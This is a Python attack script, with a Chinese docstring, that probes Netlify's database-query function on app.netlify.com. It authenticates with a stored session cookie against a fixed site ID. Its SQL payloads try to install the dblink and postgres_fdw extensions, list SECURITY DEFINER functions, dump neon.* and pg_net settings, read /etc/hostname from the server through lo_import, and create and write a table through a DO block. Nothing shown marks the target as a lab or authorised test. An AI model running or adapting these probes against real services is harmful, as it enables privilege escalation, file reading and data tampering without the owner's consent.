# -*- coding: utf-8 -*-
"""Netlify database-query 特性利用波2:DO 编排 + 扩展安装 + prosecdef + neon 配置(假设检验)
P1 create ext dblink / P2 create ext postgres_fdw / P3 prosecdef 函数 / P4 neon.* settings / P5 lo_import
"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()


def req(body):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=40)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw


def run(tag, sql):
    try:
        s, raw = req({'siteId': SITE_ID, 'action': 'query', 'sql': sql})
        body = raw[:500].decode('utf-8', 'ignore').replace('\n', ' ')
        print('%-22s [%d] %s' % (tag, s, body))
    except Exception as e:
        print('%-22s ERR %s' % (tag, str(e)[:80]))


run('P1_ext_dblink', "create extension if not exists dblink")
run('P2_ext_postgres_fdw', "create extension if not exists postgres_fdw")
run('P3_prosecdef', "select n.nspname, p.proname from pg_proc p join pg_namespace n on n.oid = p.pronamespace where p.prosecdef and n.nspname not in ('pg_catalog','information_schema')")
run('P4_neon_settings', "select name, setting from pg_settings where name like 'neon.%' or name like 'pg_net%'")
run('P5_lo_import', "select lo_import('/etc/hostname')")
run('P6_do_multi', "do $$ begin execute 'create table if not exists probe_t(a int)'; execute 'insert into probe_t values (7)'; end $$")
run('P7_do_readback', "select * from probe_t")
